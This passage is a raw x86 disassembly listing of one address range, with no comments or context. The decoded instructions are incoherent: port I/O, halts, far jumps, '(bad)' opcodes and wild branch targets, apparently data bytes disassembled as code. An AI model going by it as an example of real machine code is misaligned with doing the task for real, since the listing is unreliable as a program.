  432279:	95                   	xchg   %eax,%ebp
  43227a:	ee                   	out    %al,(%dx)
  43227b:	33 75 e2             	xor    -0x1e(%ebp),%esi
  43227e:	fa                   	cli
  43227f:	32 c5                	xor    %ch,%al
  432281:	24 eb                	and    $0xeb,%al
  432283:	6e                   	outsb  %ds:(%esi),(%dx)
  432284:	5f                   	pop    %edi
  432285:	23 19                	and    (%ecx),%ebx
  432287:	d2 d6                	rcl    %cl,%dh
  432289:	2d db 28 36 ac       	sub    $0xac3628db,%eax
  43228e:	23 b2 bc e0 cc e0    	and    -0x1f331f44(%edx),%esi
  432294:	ce                   	into
  432295:	20 da                	and    %bl,%dl
  432297:	6a 1c                	push   $0x1c
  432299:	1d c4 26 ef 1a       	sbb    $0x1aef26c4,%eax
  43229e:	17                   	pop    %ss
  43229f:	13 60 b1             	adc    -0x4f(%eax),%esp
  4322a2:	5b                   	pop    %ebx
  4322a3:	01 d5                	add    %edx,%ebp
  4322a5:	ef                   	out    %eax,(%dx)
  4322a6:	4b                   	dec    %ebx
  4322a7:	73 1d                	jae    0x4322c6
  4322a9:	ea dd 0a 2b 7c 3e d4 	ljmp   $0xd43e,$0x7c2b0add
  4322b0:	81 61 f5 93 65 38 b8 	andl   $0xb8386593,-0xb(%ecx)
  4322b7:	e7 6c                	out    %eax,$0x6c
  4322b9:	0d e0 ac 21 92       	or     $0x9221ace0,%eax
  4322be:	69 eb 15 4d af 1e    	imul   $0x1eaf4d15,%ebx,%ebp
  4322c4:	fe 46 40             	incb   0x40(%esi)
  4322c7:	37                   	aaa
  4322c8:	2c 18                	sub    $0x18,%al
  4322ca:	f4                   	hlt
  4322cb:	5e                   	pop    %esi
  4322cc:	3d c4 bf e0 bd       	cmp    $0xbde0bfc4,%eax
  4322d1:	e9 0b f8 35 1b       	jmp    0x1b791ae1
  4322d6:	e7 9b                	out    %eax,$0x9b
  4322d8:	cf                   	iret
  4322d9:	82 11 f9             	adcb   $0xf9,(%ecx)
  4322dc:	99                   	cltd
  4322dd:	bd 9a 1a 77 1b       	mov    $0x1b771a9a,%ebp
  4322e2:	ac                   	lods   %ds:(%esi),%al
  4322e3:	1a d1                	sbb    %cl,%dl
  4322e5:	95                   	xchg   %eax,%ebp
  4322e6:	d2 cf                	ror    %cl,%bh
  4322e8:	69 b2 6c 4f a7 63 c1 	imul   $0xe8e2cdc1,0x63a74f6c(%edx),%esi
  4322ef:	cd e2 e8 
  4322f2:	5b                   	pop    %ebx
  4322f3:	ee                   	out    %al,(%dx)
  4322f4:	1f                   	pop    %ds
  4322f5:	f8                   	clc
  4322f6:	6d                   	insl   (%dx),%es:(%edi)
  4322f7:	0e                   	push   %cs
  4322f8:	11 7f 3f             	adc    %edi,0x3f(%edi)
  4322fb:	97                   	xchg   %eax,%edi
  4322fc:	48                   	dec    %eax
  4322fd:	2a 46 54             	sub    0x54(%esi),%al
  432300:	3b dc                	cmp    %esp,%ebx
  432302:	1d aa b6 b4 bd       	sbb    $0xbdb4b6aa,%eax
  432307:	5d                   	pop    %ebp
  432308:	a3 eb a6 66 87       	mov    %eax,0x8766a6eb
  43230d:	d9 a9 8d 08 90 0f    	fldcw  0xf90088d(%ecx)
  432313:	4a                   	dec    %edx
  432314:	bf cd f6 2e 68       	mov    $0x682ef6cd,%edi
  432319:	af                   	scas   %es:(%edi),%eax
  43231a:	c1 59 b7 f8          	rcrl   $0xf8,-0x49(%ecx)
  43231e:	08 0f                	or     %cl,(%edi)
  432320:	ba ff 74 60 33       	mov    $0x336074ff,%edx
  432325:	cf                   	iret
  432326:	43                   	inc    %ebx
  432327:	75 0b                	jne    0x432334
  432329:	9a cc 67 21 90 20 84 	lcall  $0x8420,$0x902167cc
  432330:	4d                   	dec    %ebp
  432331:	20 ad 9d d4 bc 24    	and    %ch,0x24bcd49d(%ebp)
  432337:	c6                   	(bad)
  432338:	e5 1d                	in     $0x1d,%eax
  43233a:	59                   	pop    %ecx
  43233b:	53                   	push   %ebx
  43233c:	ed                   	in     (%dx),%eax
  43233d:	09 29                	or     %ebp,(%ecx)
  43233f:	d2 8c 41 d0 12 e6 15 	rorb   %cl,0x15e612d0(%ecx,%eax,2)
  432346:	5c                   	pop    %esp
  432347:	ff 1e                	lcall  *(%esi)
  432349:	28 bc ca 5d 00 6e 3d 	sub    %bh,0x3d6e005d(%edx,%ecx,8)
  432350:	68 42 c5 f4 78       	push   $0x78f4c542
  432355:	d8 2c c6             	fsubrs (%esi,%eax,8)
  432358:	55                   	push   %ebp
  432359:	e2 15                	loop   0x432370
  43235b:	88 b6 14 54 ed 0c    	mov    %dh,0xced5414(%esi)
  432361:	1d 9f ae dd 88       	sbb    $0x88ddae9f,%eax
  432366:	3d 39 d9 48 15       	cmp    $0x1548d939,%eax
  43236b:	c4 b7 67 a5 37 1b    	les    0x1b37a567(%edi),%esi
  432371:	74 4e                	je     0x4323c1
  432373:	e2 c6                	loop   0x43233b
  432375:	79 3a                	jns    0x4323b1
  432377:	fd                   	std
  432378:	85 e4                	test   %esp,%esp
  43237a:	97                   	xchg   %eax,%edi
  43237b:	2e a3 33 fc 4b 1a    	mov    %eax,%cs:0x1a4bfc33
  432381:	45                   	inc    %ebp
  432382:	f4                   	hlt
  432383:	ab                   	stos   %eax,%es:(%edi)
  432384:	85 4f c9             	test   %ecx,-0x37(%edi)
  432387:	84 41 51             	test   %al,0x51(%ecx)
  43238a:	3f                   	aas
  43238b:	dc 9d 2b 81 5d ea    	fcompl -0x15a27ed5(%ebp)
  432391:	f5                   	cmc
  432392:	e2 9f                	loop   0x432333
  432394:	8a 78 f0             	mov    -0x10(%eax),%bh
  432397:	01 55 43             	add    %edx,0x43(%ebp)
  43239a:	67 90                	addr16 nop
  43239c:	e2 8b                	loop   0x432329
  43239e:	06                   	push   %es
  43239f:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4323a0:	2f                   	das
  4323a1:	ca b1 47             	lret   $0x47b1
  4323a4:	f9                   	stc
  4323a5:	20 3a                	and    %bh,(%edx)
  4323a7:	02 9f ae b5 87 10    	add    0x1087b5ae(%edi),%bl
  4323ad:	85 a5 49 3b 0b ea    	test   %esp,-0x15f4c4b7(%ebp)
  4323b3:	cd ce                	int    $0xce
  4323b5:	8f                   	(bad)
  4323b6:	31 ea                	xor    %ebp,%edx
  4323b8:	44                   	inc    %esp
  4323b9:	43                   	inc    %ebx
  4323ba:	c5 f5 14 93 76 3d 99 	vunpcklpd 0x10993d76(%ebx),%ymm1,%ymm2
  4323c1:	10 
  4323c2:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4323c3:	57                   	push   %edi
  4323c4:	64 34 8a             	fs xor $0x8a,%al
  4323c7:	7e ac                	jle    0x432375
  4323c9:	0c e5                	or     $0xe5,%al
  4323cb:	31 c8                	xor    %ecx,%eax
  4323cd:	58                   	pop    %eax
  4323ce:	c7                   	(bad)
  4323cf:	fc                   	cld
  4323d0:	51                   	push   %ecx
  4323d1:	5c                   	pop    %esp
  4323d2:	3a e8                	cmp    %al,%ch
  4323d4:	b5 f5                	mov    $0xf5,%ch
  4323d6:	36 19 36             	sbb    %esi,%ss:(%esi)
  4323d9:	e7 36                	out    %eax,$0x36
  4323db:	4a                   	dec    %edx
  4323dc:	85 17                	test   %edx,(%edi)
  4323de:	07                   	pop    %es
  4323df:	53                   	push   %ebx
  4323e0:	59                   	pop    %ecx
  4323e1:	66 54                	push   %sp
  4323e3:	b3 59                	mov    $0x59,%bl
  4323e5:	49                   	dec    %ecx
  4323e6:	1c 34                	sbb    $0x34,%al
  4323e8:	f0 4e                	lock dec %esi
  4323ea:	5d                   	pop    %ebp
  4323eb:	20 5f cc             	and    %bl,-0x34(%edi)
  4323ee:	be cd b2 67 2b       	mov    $0x2b67b2cd,%esi
  4323f3:	5c                   	pop    %esp
  4323f4:	66 63 ab 4b ce 58 1e 	arpl   %bp,0x1e58ce4b(%ebx)
  4323fb:	df 0e                	fisttps (%esi)
  4323fd:	06                   	push   %es
  4323fe:	28 ce                	sub    %cl,%dh
  432400:	2d 00 b3 4c bb       	sub    $0xbb4cb300,%eax
  432405:	09 e8                	or     %ebp,%eax
  432407:	d9 53 24             	fsts   0x24(%ebx)
  43240a:	2a 09                	sub    (%ecx),%cl
  43240c:	e3 2f                	jecxz  0x43243d
  43240e:	7a c5                	jp     0x4323d5
  432410:	39 99 19 fa 17 0c    	cmp    %ebx,0xc17fa19(%ecx)
  432416:	65 1d 18 36 cf 90    	gs sbb $0x90cf3618,%eax
  43241c:	77 84                	ja     0x4323a2
  43241e:	21 5e f1             	and    %ebx,-0xf(%esi)
  432421:	c5 04 42             	lds    (%edx,%eax,2),%eax
  432424:	b4 d7                	mov    $0xd7,%ah
  432426:	d1 05 41 f6 d1 fb    	roll   $1,0xfbd1f641
  43242c:	c3                   	ret
  43242d:	7a fc                	jp     0x43242b
  43242f:	f4                   	hlt
  432430:	b2 54                	mov    $0x54,%dl
  432432:	94                   	xchg   %eax,%esp
  432433:	8c a3 4f ed 5a 54    	mov    %fs,0x545aed4f(%ebx)
  432439:	1c fb                	sbb    $0xfb,%al
  43243b:	2e 42                	cs inc %edx
  43243d:	93                   	xchg   %eax,%ebx
  43243e:	ac                   	lods   %ds:(%esi),%al
  43243f:	6c                   	insb   (%dx),%es:(%edi)
  432440:	ed                   	in     (%dx),%eax
  432441:	50                   	push   %eax
  432442:	d9 d5                	(bad)
  432444:	17                   	pop    %ss
  432445:	9d                   	popf
  432446:	f4                   	hlt
  432447:	0c 82                	or     $0x82,%al
  432449:	8e 47 f0             	mov    -0x10(%edi),%es
  43244c:	b8 1f 37 4f 90       	mov    $0x904f371f,%eax
  432451:	1c 1d                	sbb    $0x1d,%al
  432453:	f9                   	stc
  432454:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  432455:	8c e1                	mov    %fs,%ecx
  432457:	89 61 7a             	mov    %esp,0x7a(%ecx)
  43245a:	12 da                	adc    %dl,%bl
  43245c:	73 ba                	jae    0x432418
  43245e:	cd fd                	int    $0xfd
  432460:	37                   	aaa
  432461:	21 51 6a             	and    %edx,0x6a(%ecx)
  432464:	75 ff                	jne    0x432465
  432466:	09 12                	or     %edx,(%edx)
  432468:	d7                   	xlat   %ds:(%ebx)
  432469:	2f                   	das
  43246a:	b4 24                	mov    $0x24,%ah
  43246c:	fc                   	cld
  43246d:	25 25 f6 1a 4b       	and    $0x4b1af625,%eax
  432472:	e8 8f f3 53 a6       	call   0xa6971806
  432477:	f1                   	int1
  432478:	8c 85 6b 7c 44 eb    	mov    %es,-0x14bb8395(%ebp)
  43247e:	d7                   	xlat   %ds:(%ebx)
  43247f:	b4 76                	mov    $0x76,%ah
  432481:	d7                   	xlat   %ds:(%ebx)
  432482:	e7 82                	out    %eax,$0x82
  432484:	7d 64                	jge    0x4324ea
  432486:	03 4c 80 37          	add    0x37(%eax,%eax,4),%ecx
  43248a:	f9                   	stc
  43248b:	11 f3                	adc    %esi,%ebx
  43248d:	b1 5e                	mov    $0x5e,%cl
  43248f:	4a                   	dec    %edx
  432490:	13 4f 02             	adc    0x2(%edi),%ecx
  432493:	71 af                	jno    0x432444
  432495:	8b 33                	mov    (%ebx),%esi
  432497:	a0 d6 48 bb 70       	mov    0x70bb48d6,%al
  43249c:	b7 42                	mov    $0x42,%bh
  43249e:	1d c8 52 7b 8c       	sbb    $0x8c7b52c8,%eax
  4324a3:	e7 71                	out    %eax,$0x71
  4324a5:	b0 0d                	mov    $0xd,%al
  4324a7:	16                   	push   %ss
  4324a8:	68 58 d5 5b 95       	push   $0x955bd558
  4324ad:	14 af                	adc    $0xaf,%al
  4324af:	97                   	xchg   %eax,%edi
  4324b0:	6c                   	insb   (%dx),%es:(%edi)
  4324b1:	da a8 ca c9 e7 9c    	fisubrl -0x63183636(%eax)
  4324b7:	21 fc                	and    %edi,%esp
  4324b9:	e3 55                	jecxz  0x432510
  4324bb:	cb                   	lret
  4324bc:	d5 d7                	aad    $0xd7
  4324be:	6a 25                	push   $0x25
  4324c0:	bf d2 b8 56 53       	mov    $0x5356b8d2,%edi
  4324c5:	4e                   	dec    %esi
  4324c6:	e8 ed 91 c1 e7       	call   0xe804b6b8
  4324cb:	50                   	push   %eax
  4324cc:	b8 9f 5a 82 48       	mov    $0x48825a9f,%eax
  4324d1:	a3 5e 39 52 ed       	mov    %eax,0xed52395e
  4324d6:	58                   	pop    %eax
  4324d7:	a1 53 dd fa c6       	mov    0xc6fadd53,%eax
  4324dc:	5e                   	pop    %esi
  4324dd:	23 be d2 a7 68 36    	and    0x3668a7d2(%esi),%edi
  4324e3:	08 23                	or     %ah,(%ebx)
  4324e5:	2f                   	das
  4324e6:	1c 6d                	sbb    $0x6d,%al
  4324e8:	e1 49                	loope  0x432533
  4324ea:	99                   	cltd
  4324eb:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4324ec:	6a 5c                	push   $0x5c
  4324ee:	49                   	dec    %ecx
  4324ef:	d8 a2 ce 74 70 e0    	fsubs  -0x1f8f8b32(%edx)
  4324f5:	41                   	inc    %ecx
  4324f6:	57                   	push   %edi
  4324f7:	19 b5 a8 c6 f4 b0    	sbb    %esi,-0x4f0b3958(%ebp)
  4324fd:	0b 1d 8d 45 ff 62    	or     0x62ff458d,%ebx
  432503:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  432504:	b0 d4                	mov    $0xd4,%al
  432506:	13 50 0c             	adc    0xc(%eax),%edx
  432509:	64 59                	fs pop %ecx
  43250b:	fb                   	sti
  43250c:	93                   	xchg   %eax,%ebx
  43250d:	bb e1 f2 39 8f       	mov    $0x8f39f2e1,%ebx
  432512:	25 16 e4 09 00       	and    $0x9e416,%eax
  432517:	e5 d2                	in     $0xd2,%eax
  432519:	34 79                	xor    $0x79,%al
  43251b:	e1 e5                	loope  0x432502
  43251d:	b5 f7                	mov    $0xf7,%ch
  43251f:	2d c2 a6 38 42       	sub    $0x4238a6c2,%eax
  432524:	92                   	xchg   %eax,%edx
  432525:	bc 4f fd 27 4a       	mov    $0x4a27fd4f,%esp
  43252a:	e7 a9                	out    %eax,$0xa9
  43252c:	b1 a5                	mov    $0xa5,%cl
  43252e:	ea bc 6d 5f 49 37 a3 	ljmp   $0xa337,$0x495f6dbc
  432535:	b5 c4                	mov    $0xc4,%ch
  432537:	1f                   	pop    %ds
  432538:	c0 6d c9 e8          	shrb   $0xe8,-0x37(%ebp)
  43253c:	fd                   	std
  43253d:	b7 21                	mov    $0x21,%bh
  43253f:	42                   	inc    %edx
  432540:	8c c0                	mov    %es,%eax
  432542:	ec                   	in     (%dx),%al
  432543:	5f                   	pop    %edi
  432544:	68 7c 0d f0 8e       	push   $0x8ef00d7c
  432549:	24 5f                	and    $0x5f,%al
  43254b:	5a                   	pop    %edx
  43254c:	1e                   	push   %ds
  43254d:	f1                   	int1
  43254e:	23 13                	and    (%ebx),%edx
  432550:	b9 53 69 c4 97       	mov    $0x97c46953,%ecx
  432555:	eb 5e                	jmp    0x4325b5
  432557:	0d 4c 29 e9 b9       	or     $0xb9e9294c,%eax
  43255c:	67 d1 78 39          	sarl   $1,0x39(%bx,%si)
  432560:	4f                   	dec    %edi
  432561:	77 62                	ja     0x4325c5
  432563:	3a c8                	cmp    %al,%cl
  432565:	b0 14                	mov    $0x14,%al
  432567:	03 4e 0e             	add    0xe(%esi),%ecx
  43256a:	38 10                	cmp    %dl,(%eax)
  43256c:	9d                   	popf
  43256d:	fa                   	cli
  43256e:	40                   	inc    %eax
  43256f:	5b                   	pop    %ebx
  432570:	75 aa                	jne    0x43251c
  432572:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  432573:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  432574:	04 d6                	add    $0xd6,%al
  432576:	7f a4                	jg     0x43251c
  432578:	82 35 7f d3 ec 2c e7 	xorb   $0xe7,0x2cecd37f
  43257f:	24 26                	and    $0x26,%al
  432581:	d0 15 d2 a7 79 ae    	rclb   $1,0xae79a7d2
  432587:	b4 f9                	mov    $0xf9,%ah
  432589:	01 d8                	add    %ebx,%eax
  43258b:	45                   	inc    %ebp
  43258c:	31 71 43             	xor    %esi,0x43(%ecx)
  43258f:	49                   	dec    %ecx
  432590:	7b 26                	jnp    0x4325b8
  432592:	cb                   	lret
  432593:	66 95                	xchg   %ax,%bp
  432595:	a2 7a 46 ff 66       	mov    %al,0x66ff467a
  43259a:	5b                   	pop    %ebx
  43259b:	7c 68                	jl     0x432605
  43259d:	5d                   	pop    %ebp
  43259e:	61                   	popa
  43259f:	78 80                	js     0x432521
  4325a1:	2f                   	das
  4325a2:	ab                   	stos   %eax,%es:(%edi)
  4325a3:	5d                   	pop    %ebp
  4325a4:	29 f3                	sub    %esi,%ebx
  4325a6:	33 b7 91 34 c8 99    	xor    -0x6637cb6f(%edi),%esi
  4325ac:	6a ce                	push   $0xffffffce
  4325ae:	b0 56                	mov    $0x56,%al
  4325b0:	d0 06                	rolb   $1,(%esi)
  4325b2:	30 c6                	xor    %al,%dh
  4325b4:	19 73 52             	sbb    %esi,0x52(%ebx)
  4325b7:	5c                   	pop    %esp
  4325b8:	31 59 31             	xor    %ebx,0x31(%ecx)
  4325bb:	4c                   	dec    %esp
  4325bc:	f4                   	hlt
  4325bd:	8c ae 3a b3 83 b8    	mov    %gs,-0x477c4cc6(%esi)
  4325c3:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  4325c4:	0f ca                	bswap  %edx
  4325c6:	55                   	push   %ebp
  4325c7:	86 86 de c0 89 4c    	xchg   %al,0x4c89c0de(%esi)
  4325cd:	af                   	scas   %es:(%edi),%eax
  4325ce:	94                   	xchg   %eax,%esp
  4325cf:	1e                   	push   %ds
  4325d0:	92                   	xchg   %eax,%edx
  4325d1:	4a                   	dec    %edx
  4325d2:	ce                   	into
  4325d3:	15 54 df 5d 91       	adc    $0x915ddf54,%eax
  4325d8:	74 f0                	je     0x4325ca
  4325da:	c8 72 df 85          	enter  $0xdf72,$0x85
  4325de:	4c                   	dec    %esp
  4325df:	43                   	inc    %ebx
  4325e0:	43                   	inc    %ebx
  4325e1:	59                   	pop    %ecx
  4325e2:	9a 9b 98 ae 12 cb 04 	lcall  $0x4cb,$0x12ae989b
  4325e9:	eb 34                	jmp    0x43261f
  4325eb:	d7                   	xlat   %ds:(%ebx)
  4325ec:	b0 ea                	mov    $0xea,%al
  4325ee:	2e 20 a9 22 bd 7c 1e 	and    %ch,%cs:0x1e7cbd22(%ecx)
  4325f5:	77 04                	ja     0x4325fb
  4325f7:	a1 51 4b 25 c4       	mov    0xc4254b51,%eax
  4325fc:	f9                   	stc
  4325fd:	05 e9 5f f4 fe       	add    $0xfef45fe9,%eax
  432602:	60                   	pusha
  432603:	fd                   	std
  432604:	c3                   	ret
  432605:	c8 6b 74 1a          	enter  $0x746b,$0x1a
  432609:	f4                   	hlt
  43260a:	36 89 0a             	mov    %ecx,%ss:(%edx)
  43260d:	88 e7                	mov    %ah,%bh
  43260f:	82 da 2c             	sbb    $0x2c,%dl
  432612:	e2 05                	loop   0x432619
  432614:	4b                   	dec    %ebx
  432615:	1c 70                	sbb    $0x70,%al
  432617:	e8 ca 5b 01 4b       	call   0x4b4481e6
  43261c:	20 13                	and    %dl,(%ebx)
  43261e:	5f                   	pop    %edi
  43261f:	fe cc                	dec    %ah
  432621:	d6                   	salc
  432622:	ac                   	lods   %ds:(%esi),%al
  432623:	83 c2 28             	add    $0x28,%edx
  432626:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  432627:	db 5c 4c c8          	fistpl -0x38(%esp,%ecx,2)
  43262b:	fe                   	(bad)
  43262c:	d8 b3 97 da d7 98    	fdivs  -0x67282569(%ebx)
  432632:	ea 84 92 79 0c ad dd 	ljmp   $0xddad,$0xc799284
  432639:	2b a7 c2 f0 01 e3    	sub    -0x1cfe0f3e(%edi),%esp
  43263f:	8e e9                	mov    %ecx,%gs
  432641:	b3 7c                	mov    $0x7c,%bl
  432643:	3e a8 f0             	ds test $0xf0,%al
  432646:	96                   	xchg   %eax,%esi
  432647:	37                   	aaa
  432648:	88 6e 9a             	mov    %ch,-0x66(%esi)
  43264b:	45                   	inc    %ebp
  43264c:	70 98                	jo     0x4325e6
  43264e:	93                   	xchg   %eax,%ebx
  43264f:	9a 6b cd 8f 96 0e 96 	lcall  $0x960e,$0x968fcd6b
  432656:	ed                   	in     (%dx),%eax
  432657:	56                   	push   %esi
  432658:	8d 2f                	lea    (%edi),%ebp
  43265a:	f4                   	hlt
  43265b:	fc                   	cld
  43265c:	2e 5a                	cs pop %edx
  43265e:	45                   	inc    %ebp
  43265f:	e2 c3                	loop   0x432624
  432661:	bc c0 c5 f3 d3       	mov    $0xd3f3c5c0,%esp
  432666:	c7                   	(bad)
  432667:	ea 37 80 7e 9d 6f 2e 	ljmp   $0x2e6f,$0x9d7e8037
  43266e:	67 82 5c c3 0f       	sbbb   $0xf,-0x3d(%si)
  432673:	2d ee e7 62 0a       	sub    $0xa62e7ee,%eax
  432678:	58                   	pop    %eax
  432679:	10 50 89             	adc    %dl,-0x77(%eax)
  43267c:	27                   	daa
  43267d:	45                   	inc    %ebp
  43267e:	b9 44 e0 04 1a       	mov    $0x1a04e044,%ecx
  432683:	1e                   	push   %ds
  432684:	61                   	popa
  432685:	9d                   	popf
  432686:	15 2e 20 e0 98       	adc    $0x98e0202e,%eax
  43268b:	2f                   	das
  43268c:	f2 df 60 fc          	repnz fbld -0x4(%eax)
  432690:	1b e3                	sbb    %ebx,%esp
  432692:	ca 3c 83             	lret   $0x833c
  432695:	f6 43 29 b7          	testb  $0xb7,0x29(%ebx)
  432699:	3d 2b 4f 25 49       	cmp    $0x49254f2b,%eax
  43269e:	b6 71                	mov    $0x71,%dh
  4326a0:	7f b1                	jg     0x432653
  4326a2:	9a 11 08 f7 9f 41 b8 	lcall  $0xb841,$0x9ff70811
  4326a9:	45                   	inc    %ebp
  4326aa:	76 9d                	jbe    0x432649
  4326ac:	d4 20                	aam    $0x20
  4326ae:	bb 79 3a 9f 12       	mov    $0x129f3a79,%ebx
  4326b3:	f4                   	hlt
  4326b4:	8f                   	(bad)
  4326b5:	4c                   	dec    %esp
  4326b6:	0b c5                	or     %ebp,%eax
  4326b8:	d7                   	xlat   %ds:(%ebx)
  4326b9:	3f                   	aas
  4326ba:	9f                   	lahf
  4326bb:	05 57 a0 fb 68       	add    $0x68fba057,%eax
  4326c0:	ba 3c 87 25 e4       	mov    $0xe425873c,%edx
  4326c5:	5c                   	pop    %esp
  4326c6:	42                   	inc    %edx
  4326c7:	b7 34                	mov    $0x34,%bh
  4326c9:	43                   	inc    %ebx
  4326ca:	b6 d3                	mov    $0xd3,%dh
  4326cc:	a0 75 39 c2 07       	mov    0x7c23975,%al
  4326d1:	13 7f 92             	adc    -0x6e(%edi),%edi
  4326d4:	b7 0f                	mov    $0xf,%bh
  4326d6:	4b                   	dec    %ebx
  4326d7:	f5                   	cmc
  4326d8:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4326d9:	4d                   	dec    %ebp
  4326da:	cd 7c                	int    $0x7c
  4326dc:	1c 9d                	sbb    $0x9d,%al
  4326de:	e6 ad                	out    %al,$0xad
  4326e0:	5d                   	pop    %ebp
  4326e1:	81 0a b7 77 29 79    	orl    $0x792977b7,(%edx)
  4326e7:	76 dd                	jbe    0x4326c6
  4326e9:	ac                   	lods   %ds:(%esi),%al
  4326ea:	b1 e0                	mov    $0xe0,%cl
  4326ec:	32 47 80             	xor    -0x80(%edi),%al
  4326ef:	cb                   	lret
  4326f0:	8c 2b                	mov    %gs,(%ebx)
  4326f2:	23 d4                	and    %esp,%edx
  4326f4:	09 31                	or     %esi,(%ecx)
  4326f6:	ff                   	ljmp   (bad)
  4326f7:	eb 50                	jmp    0x432749
  4326f9:	27                   	daa
  4326fa:	ab                   	stos   %eax,%es:(%edi)
  4326fb:	10 d6                	adc    %dl,%dh
  4326fd:	62 7c d0 9a          	bound  %edi,-0x66(%eax,%edx,8)
  432701:	90                   	nop
  432702:	81 e5 a6 de b0 3d    	and    $0x3db0dea6,%ebp
  432708:	75 5d                	jne    0x432767
  43270a:	47                   	inc    %edi
  43270b:	e2 ee                	loop   0x4326fb
  43270d:	16                   	push   %ss
  43270e:	da 9a 2e 96 c8 fb    	ficompl -0x43769d2(%edx)
  432714:	8a 74 de 4b          	mov    0x4b(%esi,%ebx,8),%dh
  432718:	48                   	dec    %eax
  432719:	64 80 a7 3c 83 6e b0 	andb   $0xf4,%fs:-0x4f917cc4(%edi)
  432720:	f4 
  432721:	44                   	inc    %esp
  432722:	89 7f c0             	mov    %edi,-0x40(%edi)
  432725:	c3                   	ret
  432726:	81 6e 03 2c 45 60 50 	subl   $0x5060452c,0x3(%esi)
  43272d:	54                   	push   %esp
  43272e:	57                   	push   %edi
  43272f:	dd ba b8 dd 10 13    	fnstsw 0x1310ddb8(%edx)
  432735:	de 37                	fidivs (%edi)
  432737:	88 e7                	mov    %ah,%bh
  432739:	53                   	push   %ebx
  43273a:	b8 2b 84 fc 83       	mov    $0x83fc842b,%eax
  43273f:	5d                   	pop    %ebp
  432740:	91                   	xchg   %eax,%ecx
  432741:	66 53                	push   %bx
  432743:	47                   	inc    %edi
  432744:	7e 33                	jle    0x432779
  432746:	a2 0c 59 64 db       	mov    %al,0xdb64590c
  43274b:	93                   	xchg   %eax,%ebx
  43274c:	03 e2                	add    %edx,%esp
  43274e:	16                   	push   %ss
  43274f:	66 3e 7a 06          	data16 jp,pt 0x432759
  432753:	fa                   	cli
  432754:	e6 c9                	out    %al,$0xc9
  432756:	d3 ab 2f 93 a2 82    	shrl   %cl,-0x7d5d6cd1(%ebx)
  43275c:	20 a9 c4 87 f1 1c    	and    %ch,0x1cf187c4(%ecx)
  432762:	4b                   	dec    %ebx
  432763:	0f e9 46 a9          	psubsw -0x57(%esi),%mm0
  432767:	01 95 54 c1 9e f2    	add    %edx,-0xd613eac(%ebp)
  43276d:	1f                   	pop    %ds
  43276e:	a9 5c 22 66 86       	test   $0x8666225c,%eax
  432773:	1f                   	pop    %ds
  432774:	52                   	push   %edx
  432775:	87 2f                	xchg   %ebp,(%edi)
  432777:	22 9f 96 46 dd da    	and    -0x2522b96a(%edi),%bl
  43277d:	4f                   	dec    %edi
  43277e:	02 ba f0 f2 18 75    	add    0x7518f2f0(%edx),%bh
  432784:	a1 1b a5 ec cd       	mov    0xcdeca51b,%eax
  432789:	9b                   	fwait
  43278a:	ec                   	in     (%dx),%al
  43278b:	f1                   	int1
  43278c:	33 df                	xor    %edi,%ebx
  43278e:	e2 4b                	loop   0x4327db
  432790:	29 69 62             	sub    %ebp,0x62(%ecx)
  432793:	4c                   	dec    %esp
  432794:	6d                   	insl   (%dx),%es:(%edi)
  432795:	18 30                	sbb    %dh,(%eax)
  432797:	89 0c 02             	mov    %ecx,(%edx,%eax,1)
  43279a:	26 62 b2 3a 27 76 20 	bound  %esi,%es:0x2076273a(%edx)
  4327a1:	5c                   	pop    %esp
  4327a2:	38 ad 2e ab c3 a2    	cmp    %ch,-0x5d3c54d2(%ebp)
  4327a8:	bb e0 aa 62 ca       	mov    $0xca62aae0,%ebx
  4327ad:	54                   	push   %esp
  4327ae:	dd 4b 1a             	fisttpll 0x1a(%ebx)
  4327b1:	78 ad                	js     0x432760
  4327b3:	b0 9b                	mov    $0x9b,%al
  4327b5:	45                   	inc    %ebp
  4327b6:	dd a3 ed b7 70 82    	frstor -0x7d8f4813(%ebx)
  4327bc:	54                   	push   %esp
  4327bd:	64 c8 cf 94 2a       	fs enter $0x94cf,$0x2a
  4327c2:	c1 aa d5 95 3d e1 60 	shrl   $0x60,-0x1ec26a2b(%edx)
  4327c9:	c3                   	ret
  4327ca:	87 3d 65 be e6 66    	xchg   %edi,0x66e6be65
  4327d0:	ec                   	in     (%dx),%al
  4327d1:	ac                   	lods   %ds:(%esi),%al
  4327d2:	08 3e                	or     %bh,(%esi)
  4327d4:	12 5f 40             	adc    0x40(%edi),%bl
  4327d7:	fb                   	sti
  4327d8:	db 30                	(bad) (%eax)
  4327da:	06                   	push   %es
  4327db:	2d 1c 3b 4b 5a       	sub    $0x5a4b3b1c,%eax
  4327e0:	29 79 aa             	sub    %edi,-0x56(%ecx)
  4327e3:	c5 51 b1             	lds    -0x4f(%ecx),%edx
  4327e6:	9c                   	pushf
  4327e7:	c4 27                	les    (%edi),%esp
  4327e9:	93                   	xchg   %eax,%ebx
  4327ea:	95                   	xchg   %eax,%ebp
  4327eb:	d2 24 5e             	shlb   %cl,(%esi,%ebx,2)
  4327ee:	9e                   	sahf
  4327ef:	fc                   	cld
  4327f0:	04 3e                	add    $0x3e,%al
  4327f2:	97                   	xchg   %eax,%edi
  4327f3:	aa                   	stos   %al,%es:(%edi)
  4327f4:	96                   	xchg   %eax,%esi
  4327f5:	d5 6f                	aad    $0x6f
  4327f7:	f2 54                	repnz push %esp
  4327f9:	9d                   	popf
  4327fa:	6e                   	outsb  %ds:(%esi),(%dx)
  4327fb:	19 73 0f             	sbb    %esi,0xf(%ebx)
  4327fe:	04 7f                	add    $0x7f,%al
  432800:	84 73 7d             	test   %dh,0x7d(%ebx)
  432803:	4d                   	dec    %ebp
  432804:	c9                   	leave
  432805:	34 52                	xor    $0x52,%al
  432807:	fa                   	cli
  432808:	fd                   	std
  432809:	8e 6e 9a             	mov    -0x66(%esi),%gs
  43280c:	2c 79                	sub    $0x79,%al
  43280e:	d1 74 05 38          	shll   $1,0x38(%ebp,%eax,1)
  432812:	6f                   	outsl  %ds:(%esi),(%dx)
  432813:	ab                   	stos   %eax,%es:(%edi)
  432814:	f0 40                	lock inc %eax
  432816:	95                   	xchg   %eax,%ebp
